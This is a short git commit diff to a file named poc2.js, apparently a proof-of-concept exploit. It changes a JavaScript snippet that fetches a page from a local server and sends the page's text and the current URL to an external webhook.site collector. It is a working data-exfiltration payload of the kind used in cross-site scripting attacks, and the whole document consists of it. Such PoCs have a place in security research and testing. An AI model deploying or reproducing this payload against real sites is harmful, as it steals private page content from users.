dc15de8d609f13060de49f050d3b9a3c363c875a
karvashy <98531740+karvashy@users.noreply.github.com>
2022-02-23 22:12:51 +0530

    Update poc2.js

--- poc2.js
+++ poc2.js
@@ -1,3 +1,3 @@
-fetch("http://127.0.0.1:9000/view/93a5a46e-25ed-41fa-8812-b471afa1a1c9")
+fetch("http://127.0.0.1:9000/view/fe20f57d-b9b2-4574-a471-b8587155c593")
   .then(r => {return r.text()})
-  .then((d) => {fetch("https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d+"&domain="+window.location.href)})
+  .then((d) => {fetch(" https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d+"&domain="+window.location.href)})
